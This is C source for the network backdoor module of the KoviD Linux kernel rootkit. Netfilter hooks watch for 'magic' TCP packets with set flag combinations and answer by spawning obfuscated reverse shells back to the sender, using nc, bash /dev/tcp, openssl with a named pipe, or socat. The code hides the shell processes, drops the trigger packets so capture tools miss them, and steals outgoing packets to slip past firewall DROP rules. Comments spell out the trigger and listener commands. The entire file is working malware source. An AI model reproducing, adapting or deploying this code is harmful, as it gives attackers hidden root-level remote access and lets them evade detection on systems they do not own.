/**
 * Linux Kernel version <= 5.8.0
 * - hash
 *
 *  KoviD rootkit
 */

#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
#include <linux/umh.h>
#else
#include <linux/kmod.h>
#endif
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter/x_tables.h>
#include <linux/kfifo.h>
#include <linux/kthread.h>
#include "fs.h"
#include "lkm.h"
#include "obfstr.h"

static LIST_HEAD(iph_node);
struct iph_node_t {
    struct iphdr *iph;
    struct tcphdr *tcph;
    bool established;
    struct list_head list;
};

struct task_struct *tsk_iph = NULL;
#define BD_PATH_NUM 3
#define BD_OPS_SIZE 2
enum {
    RR_NULL,
    RR_NC = 80,
    RR_OPENSSL = 443,
    RR_SOCAT = 444,
    RR_SOCAT_TTY = 445
};
static int allowed_ports[] = {
    RR_NC, RR_OPENSSL, RR_SOCAT, RR_SOCAT_TTY, RR_NULL
};

struct stat_ops_t {
    int kv_port;
    /**
     * Larger than needed but
     * then I haven't decided yet
     * how many possible locations
     * we'll search, or even if
     * that could be somehow set in
     * runtime or whatever...
     */
    const char *bin[BD_PATH_NUM];
};

static struct stat_ops_t stat_ops[BD_OPS_SIZE];

static void _load_stat_ops(void) {

    stat_ops[0].kv_port = RR_OPENSSL;
    stat_ops[0].bin[0] = kv_whatever_copystr(_OBF_USR_BIN_OPENSSL,
            sizeof(_OBF_USR_BIN_OPENSSL));
    stat_ops[0].bin[1] = kv_whatever_copystr(_OBF_BIN_OPENSSL,
            sizeof(_OBF_BIN_OPENSSL));
    stat_ops[0].bin[2] = kv_whatever_copystr(_OBF_VAR_OPENSSL,
            sizeof(_OBF_VAR_OPENSSL));

    /** RR_SOCAT_TTY is the same */
    stat_ops[1].kv_port = RR_SOCAT;
    stat_ops[1].bin[0] = kv_whatever_copystr(_OBF_USR_BIN_SOCAT,
            sizeof(_OBF_USR_BIN_SOCAT));
    stat_ops[1].bin[1] = kv_whatever_copystr(_OBF_BIN_SOCAT,
            sizeof(_OBF_BIN_SOCAT));
    stat_ops[1].bin[2] = kv_whatever_copystr(_OBF_VAR_SOCAT,
            sizeof(_OBF_VAR_SOCAT));
}
static void _unload_stat_ops(void) {
    int i;
    for (i = 0; i < BD_OPS_SIZE; ++i) {
        int x;
        for (x = 0; x < BD_PATH_NUM; ++x) {
            kv_mem_free(&(stat_ops[i].bin[x]));
        }
    }
}

/**
 * Iterate over stat_ops list and query FS
 * whether the binary is available
 */
static const char *_locate_bdbin(int port) {
    int i, x;

    for (i = 0; i < BD_OPS_SIZE && stat_ops[i].kv_port != RR_NULL; ++i) {
        if (port != stat_ops[i].kv_port) continue;
        for (x = 0; stat_ops[i].bin[x] != NULL; ++x) {
            struct kstat stat;
            /** return 0 if file is found */
            if (fs_file_stat(stat_ops[i].bin[x], &stat) == 0)
                return stat_ops[i].bin[x];
        }
    }
    return NULL;
}

/**
 * Support kfifo for exchanging
 * data between the packet handler and
 * backdoor code
 */
struct kfifo_priv {
    struct iphdr *iph;
    struct tcphdr *tcph;
    int select;
};

struct nf_priv {
    struct task_struct *task;
};

#define FIFO_SIZE 128
static DECLARE_KFIFO(buffer, struct kfifo_priv *, FIFO_SIZE);

static void _put_fifo(struct kfifo_priv *data) {
    kfifo_put(&buffer, data);
}
static int _get_fifo(struct kfifo_priv **data) {
    return kfifo_get(&buffer, data);
}

static void _free_kfifo_items(void) {
    struct kfifo_priv *data;
    while (!kfifo_is_empty(&buffer)) {
        if (kfifo_get(&buffer, &data))
            kfree(data);
    }
}

/** ops struct for the callback */
static struct nf_hook_ops ops;
static struct nf_hook_ops ops_fw;


static inline bool *_is_task_running(void) {
    static bool running = false;
    return &running;
}

static inline bool *_is_task_fw_bypass_running(void) {
    static bool running = false;
    return &running;
}

/**
 * Callback used to retrieve parent's PID
 */
static int _retrieve_pid_cb(struct subprocess_info *info, struct cred *new) {
    if (info && info->data) {
        pid_t *shellpid = (int*)info->data;
        *shellpid = current->pid;
    }
    return 0;
}

static inline int _check_bdports(int port) {
    int i;
    for (i = 0; allowed_ports[i] != 0; ++i)
        if (port == allowed_ports[i]) {
            return port;
        }
    return 0;
}

static char *_build_bd_command(const char *exe, uint16_t dst_port,
        __be32 saddr, uint16_t src_port) {
    short i;
    char *bd = NULL;
    for (i = 0; allowed_ports[i] != RR_NULL && !bd; ++i) {
        switch (dst_port) {
            case RR_SOCAT_TTY:
                {
                    /**
                     * same as RR_SOCAT but on dst port RR_SOCAT_TTY
                     * Note: tail session is hidden automatically as it
                     * will be direct child of socat
                     */
                    //"%s OPENSSL:%s:%s,verify=0 EXEC:\"tail -F -n +1 /var/.o4udk\""
                    char *a = kv_whatever_copystr(_OBF_OPENSSL, sizeof(_OBF_OPENSSL));
                    char *b = kv_whatever_copystr(_OBF_VERIFY_0, sizeof(_OBF_VERIFY_0));
                    char *c = kv_whatever_copystr(_OBF_EXEC, sizeof(_OBF_EXEC));
                    char *d = kv_whatever_copystr(_OBF_TAIL, sizeof(_OBF_TAIL));
                    char *e = kv_whatever_copystr(_OBF__O4UDK, sizeof(_OBF__O4UDK));
                    if (a && b && c && d && e) {
                        int len;
                        char ip[INET_ADDRSTRLEN+1] = {0};
                        snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                        len = snprintf(NULL, 0, "%s %s:%s:%u,%s %s:\"%s%s\"", exe, a, ip, src_port, b, c, d, e);
                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
                            snprintf(bd, len, "%s %s:%s:%u,%s %s:\"%s%s\"", exe, a, ip, src_port, b, c, d, e);
                    }
                    kv_mem_free(&a,&b,&c,&d,&e);
                }
                break;
            case RR_SOCAT:
                {
                    /*
                     * openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt
                     * cat server.key server.crt > server.pem
                     * socat -d -d OPENSSL-LISTEN:<#PORT>,cert=server.pem,verify=0,fork STDOUT
                     * trigger: nping <IP> --tcp -p RR_SOCAT --flags fin,urg,ack --source-port <#PORT> -c 1
                     */
                    //"%s OPENSSL:%s:%s,verify=0 EXEC:/bin/bash"
                    char *a = kv_whatever_copystr(_OBF_OPENSSL, sizeof(_OBF_OPENSSL));
                    char *b = kv_whatever_copystr(_OBF_VERIFY_0, sizeof(_OBF_VERIFY_0));
                    char *c = kv_whatever_copystr(_OBF_EXEC, sizeof(_OBF_EXEC));
                    char *d = kv_whatever_copystr(_OBF__BIN_BASH, sizeof(_OBF__BIN_BASH));
                    if (a && b && c && d) {
                        int len;
                        char ip[INET_ADDRSTRLEN+1] = {0};
                        snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                        len = snprintf(NULL, 0, "%s %s:%s:%u,%s %s:%s", exe, a, ip, src_port, b, c, d);
                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
                            snprintf(bd, len, "%s %s:%s:%u,%s %s:%s", exe, a, ip, src_port, b, c, d);
                    }
                    kv_mem_free(&a,&b,&c,&d);
                }
                break;
            case RR_OPENSSL:
                {
                    /**
                     * openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
                     * openssl s_server -key key.pem -cert cert.pem -accept <#PORT>
                     * trigger: nping <IP> --tcp -p RR_OPENSSL --flags fin,urg,ack --source-port <#PORT> -c 1
                     */
                    //"/usr/bin/mkfifo /tmp/.stfu; /bin/sh -i < /tmp/.stfu 2>&1 |"
                    //  "%s s_client -quiet -connect %s:%s > /tmp/.stfu";
                    char *a = kv_whatever_copystr(_OBF_USR_BIN_MKFIFO, sizeof(_OBF_USR_BIN_MKFIFO));
                    char *b = kv_whatever_copystr(_OBF_TMP, sizeof(_OBF_TMP));
                    char *c = kv_whatever_copystr(_OBF__STFU, sizeof(_OBF__STFU));
                    char *d = kv_whatever_copystr(_OBF_BIN_SH, sizeof(_OBF_BIN_SH));
                    char *e = kv_whatever_copystr(_OBF_STD_TWO, sizeof(_OBF_STD_TWO));
                    char *f = kv_whatever_copystr(_OBF_SCLIENT__QUIET__CONNECT, sizeof(_OBF_SCLIENT__QUIET__CONNECT));

                    if (a && b && c && d && e && f) {
                        int len;
                        char ip[INET_ADDRSTRLEN+1] = {0};
                        snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                        len = snprintf(NULL, 0, "%s %s/%s; %s -i < %s/%s %s | %s %s %s:%u > %s/%s",
                                a, b, c, d, b, c, e, exe, f, ip, src_port, b, c);
                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
                            snprintf(bd, len, "%s %s/%s; %s -i < %s/%s %s | %s %s %s:%u > %s/%s",
                                    a, b, c, d, b, c, e, exe, f, ip, src_port, b, c);
                    }
                    kv_mem_free(&a,&b,&c,&d,&e,&f);
                }
                break;
            case RR_NC:
                {
                    /**
                     * nc <IP> -lvp <#PORT>
                     * trigger: nping <IP> --tcp -p RR_NC --flags fin,urg,ack --source-port <#PORT> -c 1
                     */
                    //"/bin/sh -i >& /dev/tcp/%s/%s 0>&1";
                    char *a = kv_whatever_copystr(_OBF_BIN_SH, sizeof(_OBF_BIN_SH));
                    char *b = kv_whatever_copystr(_OBF__INTERACTIVE, sizeof(_OBF__INTERACTIVE));
                    char *c = kv_whatever_copystr(_OBF_DEV_TCP, sizeof(_OBF_DEV_TCP));
                    char *d = kv_whatever_copystr(_OBF_STD_ZERO, sizeof(_OBF_STD_ZERO));
                    if (a && b && c && d) {
                        int len;
                        char ip[INET_ADDRSTRLEN+1] = {0};
                        snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                        len = snprintf(NULL, 0, "%s %s %s/%s/%u %s", a, b, c, ip, src_port, d);
                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
                            snprintf(bd, len, "%s %s %s/%s/%u %s", a, b, c, ip, src_port, d);
                    }
                    kv_mem_free(&a,&b,&c,&d);
                }
                break;
            default:
                break;
        }
    }
    return bd;
}
/**
 * Execute backdoor that can be either regular
 * or reverse shell
 */
static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
    char *p0 = kv_whatever_copystr(_OBF__BIN_BASH, sizeof(_OBF__BIN_BASH));
    char *p1 = kv_whatever_copystr(_OBF__C, sizeof(_OBF__C));
    char *p2 = kv_whatever_copystr(_OBF_HOME, sizeof(_OBF_HOME));
    char *p3 = kv_whatever_copystr(_OBF_TERM_LINUX, sizeof(_OBF_TERM_LINUX));
    char *argv[] = {p0, p1, NULL, NULL};
    char *envp[] = {p2, p3, NULL};
    int ret = -1;
    pid_t shellpid = 0;
    struct subprocess_info *info;
    __be32 saddr = iph->saddr;
    const char *binpath = _locate_bdbin(select == RR_SOCAT_TTY ?
            RR_SOCAT : select);
    char *rev;

    if (!p0 || !p1 || !p2 || !p3) {
        prerr("Memory error\n");
        kv_mem_free(&p0,&p1,&p2,&p3);
        return ret;
    }

    if (select != RR_NC && !binpath) {
        /** do nothing */
        prwarn("Could not find executable associated with port %d\n", select);
        kv_mem_free(&p0,&p1,&p2,&p3);
        return ret;
    }

    rev = _build_bd_command(binpath, select, saddr, htons(tcph->source));
    if (!rev) {
        /** do nothing */
        prwarn("Invalid port selection: %d\n", select);
        kv_mem_free(&p0,&p1,&p2,&p3);
        return ret;
    }


    argv[2] = rev;

    /* Initiate a new one */
    if ((info = call_usermodehelper_setup(argv[0], argv, envp,
                    GFP_KERNEL, _retrieve_pid_cb, NULL, &shellpid))) {
        ret = call_usermodehelper_exec(info, UMH_WAIT_EXEC);
    }

    /*
     * Allow some time so children can born
     * and tell about new parent PID
     * */
    msleep(100);

    if (!ret) {
        kv_hide_task_by_pid(shellpid, saddr, WHATEVER);
    }

    if (select == RR_OPENSSL) {
        /** force removal of fifo regardless , duplex will be fine... */
        // /tmp/.stfu
        char *a = kv_whatever_copystr(_OBF_TMP, sizeof(_OBF_TMP));
        char *b = kv_whatever_copystr(_OBF__STFU, sizeof(_OBF__STFU));
        int len = snprintf(NULL, 0, "%s/%s", a, b);
        if (len) {
            char f[len+1];
            snprintf(f, len+1, "%s/%s", a, b);
            ret = fs_file_rm(f);
        }
        kv_mem_free(&a,&b);
    }

    kv_mem_free(&p0,&p1,&p2,&p3,&rev);

    return ret;
}

static int _bd_add_new_iph(struct iphdr *iph, struct tcphdr *tcph) {
    struct iph_node_t *ip = kcalloc(1,
            sizeof(struct iph_node_t) , GFP_KERNEL);
    if (!ip) goto error;

    ip->iph = iph;
    ip->tcph = tcph;
    ip->established = false;
    list_add_tail(&ip->list, &iph_node);
    return 0;
error:
    prerr("Error allocating memory\n");
    return -ENOMEM;
}

bool kv_bd_search_iph_source(__be32 saddr) {
    struct iph_node_t *node, *node_safe;
    list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
        if (node->iph->saddr == saddr) {
            return true;
        }
    }
    return false;
}

bool kv_bd_established(__be32 *daddr, int dport, bool established) {
    bool rc = false;
    struct iph_node_t *node, *node_safe;

    list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
        /**
         * Stored saddr is done at the moment the magic packets are
         * received by our pre-routing netfilter hook.
         * The client sends a packet is special flags set and source address
         * is the hint that says: connect to this address and port.
         *
         * That will trigger a local application, socat, nc, etc that will
         * attempr to connect to that particular address:port. When that happens
         * we'll hook those packets in our local out netfilter hook and check
         * the matching here. Packets coming to local out filter will be destined
         * to the same address:port set in pre-routing, but this time they are
         * daddr:dport, hence the inverted check you see here.
         */
        if (node->iph->saddr == *daddr && htons(node->tcph->source) ==  dport) {
            /**
             * Make sure to mark established only once per-connection so
             * they will not loose estate.
             * This will make internal references to be kept until
             * connections are closed by clients, when tasks will be unhidden, data
             * freed and the reverse shell(s) killed.
             */
            if (!node->established) {
                node->established = established;
            }

            rc = true;
            break;
        }
    }
    return rc;
}

/**
 * Delete a particular address reference
 */
void kv_bd_cleanup_item(__be32 *saddr) {
    struct iph_node_t *node, *node_safe;
    list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
        if (node->iph->saddr == *saddr) {
            list_del(&node->list);
            kv_mem_free(&node);
            break;
        }
    }
}

/**
 * Can be used in two distinct scenarios:
 *  1 - to remove one single address node if force == false
 *  2 - to clean up all otherwise
 */
void _bd_cleanup(bool force) {
    struct iph_node_t *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &iph_node, list) {
        if (!node->established && force) {
            list_del(&node->list);
            kv_mem_free(&node);
        }
    }
}

static int _bd_watchdog_iph(void *unused) {
    while(!kthread_should_stop()) {
        msleep(500);
        _bd_cleanup(false);
    }
    do_exit(0);
}

/**
 * Watchdog thread that
 * that is awaken when there is kfifo
 * data.
 */
static int _bd_watchdog(void *t)
{
    set_current_state(TASK_INTERRUPTIBLE);

    while(!kthread_should_stop()) {
        struct kfifo_priv *kf;
        prinfo("Waiting for event\n");

        schedule();
        set_current_state(TASK_INTERRUPTIBLE);

        prinfo("Got event\n");
        /** read data set by nf_hook */
        if (_get_fifo(&kf))
        {
            _run_backdoor(kf->iph, kf->tcph, kf->select);
            kfree(kf);
        }
    }
    __set_current_state(TASK_RUNNING);

    prinfo("BD watchdog OFF\n");
    do_exit(0);
}

/**
 *  if TCP flags are:
 *  FUCK, CUNT or ASS then you know...
 */
bool kv_check_cursing(struct tcphdr *t) {
    uint8_t fuckoff = 0;
    enum { FUCK=0x8c, CUNT=0xa5, ASS=0x38 };

    fuckoff = t->fin << 7| t->syn << 6| t->rst << 5| t->psh << 4|
        t->ack << 3| t->urg << 2| t->ece <<1| t->cwr;

    //sudo nping <IP> --tcp -p <dst port> --flags <flag1,flag2,...> --source-port <reverse shell port> -c 1
    if (fuckoff == FUCK || fuckoff == CUNT || fuckoff == ASS)
        return true;

    return false;
}

/**
 * NF hook that will set data and
 * wake up backdoor if conditions are met
 */
static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
        const struct nf_hook_state *state) {
    int rc = NF_ACCEPT;
    struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
    switch (iph->protocol) {
        case IPPROTO_TCP: {
                struct nf_priv *user;
                struct kfifo_priv *kf;

                struct tcphdr *tcph = (struct tcphdr *)skb_transport_header(skb);
                int dst = _check_bdports(htons(tcph->dest));

                /** Silence libpcap on CUNT/ASS/FUCK */
                if (dst == RR_NULL || !kv_check_cursing(tcph)) break;

                kf = kzalloc(sizeof(struct kfifo_priv), GFP_KERNEL);
                if (!kf) {
                    prerr("Insufficient memory\n");
                    break;
                }

                kf->iph = iph;
                kf->tcph = tcph;
                kf->select = dst;

                /** setup data so can be read from backdoor code */
                _put_fifo(kf);

                /* Make sure we won't show up in libcap */
                _bd_add_new_iph(iph, tcph);

                user = (struct nf_priv*)priv;
                wake_up_process(user->task);

                /** make less noise, drop it here */
                rc = NF_DROP;
            }
            break;
        case IPPROTO_UDP:
            break;
        default:
            break;
    }
    return rc;
}

/**
 * This a magic place.
 * Let's suppose the target has a local netfiler rule similar to the following:
 *
 *  target     prot opt source               destination
 *  DROP       tcp  --  anywhere             <    IP    >         tcp dpt:<port>
 *
 *  Q: How are we supposed to establish a reverse shell to IP:port?
 *  A: By hijacking the netfilter stack: stealing the packet and calling okfn()
 *
 *  NF_STOLEN packets will not continue their route through the chain, hence technically
 *  they will not be blocked but would go nowhere either, unless okfn() is used: to
 *  send the packet out to the wire.
 *
 *  Part of the implementation is dedicated to internal backdoors management: keeping states,
 *  data lifetime, synchronization and more.
 *
 *  Here is a high-level diagram:
 *  .---------------..--------------.      .---------.      .------------.         .-----------..------------------.
 *  |Hacker bdclient||kv pre-routing|      |kv filter|      |revshell app|         |kv inet-out||kv bypass firewall|
 *  '---------------''--------------'      '---------'      '------------'         '-----------''------------------'
 *          |               |                   |                 |                      |               |
 *          |send magic pkts|                   |                 |                      |               |
 *          |-------------->|                   |                 |                      |               |
 *          |               |                   |                 |                      |               |
 *          |               |check match+NF_DROP|                 |                      |               |
 *          |               |------------------>|                 |                      |               |
 *          |               |                   |                 |                      |               |
 *          |               |                   |init revshell app|                      |               |
 *          |               |                   |---------------->|                      |               |
 *          |               |                   |                 |                      |               |
 *          |               |                   |                 |connect-back to Hacker|               |
 *          |               |                   |                 |--------------------->|               |
 *          |               |                   |                 |                      |               |
 *          |               |                   |                 |                      |okfn+NF_STOLEN |
 *          |               |                   |                 |                      |-------------->|
 *          |               |                   |                 |                      |               |
 *          |               |                   |   r00tshell # _ |                      |               |
 *          |<-------------------------------------------------------------------------------------------|
 *  .---------------..--------------.      .---------.      .------------.         .-----------..------------------.
 *  |Hacker bdclient||kv pre-routing|      |kv filter|      |revshell app|         |kv inet-out||kv bypass firewall|
 *  '---------------''--------------'      '---------'      '------------'         '-----------''------------------'
 */
static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
        const struct nf_hook_state *state) {
    int rc = NF_ACCEPT;
    struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
    switch (iph->protocol) {
        case IPPROTO_TCP: {
                struct tcphdr *tcph = (struct tcphdr *)skb_transport_header(skb);
                int dstport = htons(tcph->dest);
                /**
                 * include/net/tcp_states.h
                 * sk_state carries current connection state of the packet, at this point in time.
                 * What I look for here are for TCP_ESTABLISHED packets that will tell me that, well,
                 * the connection has been completed, therefore that indicates that I can keep the
                 * state and addresses for this connection, that will likely flow from now on, until
                 * the either endpoint is closed.
                 *
                 * The established state will only be recorded the first time it comes here and
                 * are kept throughout backdoor's lifetime.
                 * */
                if (kv_bd_established(&iph->daddr,
                            dstport, (skb->sk->sk_state == TCP_ESTABLISHED))) {
                    /**
                     * Kick this packet out to the wire yay!
                     */
                    state->okfn(state->net, state->sk, skb);
                    rc = NF_STOLEN;
                }
            }
            break;
        default:
            break;
    }
    return rc;
}


struct task_struct *kv_sock_start_sniff(const char *name) {
    bool *running = _is_task_running();
    static struct nf_priv priv;
    struct task_struct *tsk = NULL;

    // load sniffer
    if (!*running) {
        char *iph0 = kv_whatever_copystr(_OBF_IRQ_102_PCIEHP,
                sizeof(_OBF_IRQ_102_PCIEHP));
        // Hook pre routing
        ops.hook = _sock_hook_nf_cb;
        ops.pf = PF_INET;
        /* We'll get the packets before they are routed */
        ops.hooknum = NF_INET_PRE_ROUTING;
        /* High priority in relation to other existent hooks */
        ops.priority = NF_IP_PRI_FIRST;

        _load_stat_ops();

        INIT_KFIFO(buffer);

        tsk = kthread_run(_bd_watchdog, NULL, name);
        if (!tsk) goto leave;

        tsk_iph = kthread_run(_bd_watchdog_iph, NULL, iph0);
        kv_mem_free(&iph0);
        if (!tsk_iph) {
            kthread_stop(tsk);
            goto leave;
        }
        kv_hide_task_by_pid(tsk_iph->pid, 0, CHILDREN);

        /* Does the magic */
        priv.task = tsk;
        ops.priv = &priv;
        nf_register_net_hook(&init_net, &ops);

        *running = true;
    }
leave:
    return tsk;
}

bool kv_sock_start_fw_bypass(void) {
    bool *running = _is_task_fw_bypass_running();

    if (!*running) {
        // Hook pre routing
        ops_fw.hook = _sock_hook_nf_fw_bypass;
        ops_fw.pf = PF_INET;
        /* Packets generated by local applications that are leaving this host */
        ops_fw.hooknum = NF_INET_LOCAL_OUT;
        /* High priority in relation to other existent hooks */
        ops_fw.priority = NF_IP_PRI_FIRST;

        ops_fw.priv = NULL;
        nf_register_net_hook(&init_net, &ops_fw);

        *running = true;
    }

    return *running;
}

void kv_sock_stop_sniff(struct task_struct *tsk) {
    if (tsk) {
        bool *running = _is_task_running();
        kthread_stop(tsk);
        *running = false;
    }

    if (tsk_iph)
        kthread_stop(tsk_iph);

    nf_unregister_net_hook(&init_net, &ops);

    // unlikely to have remaining
    // but check anyway
    _free_kfifo_items();

    kfifo_free(&buffer);
    _unload_stat_ops();
}

void kv_sock_stop_fw_bypass(void) {
    bool *running = _is_task_fw_bypass_running();
    if (*running) {
        *running = false;
        nf_unregister_net_hook(&init_net, &ops_fw);
    }

    /**
     * Established connections are kept in
     * iph_node until one of them terminates, or
     * KoviD is unloaded. Key here is to always make
     * sure if one BD client exists, all remaining ones
     * are kicked-out too.
     */
    _bd_cleanup(true);
}
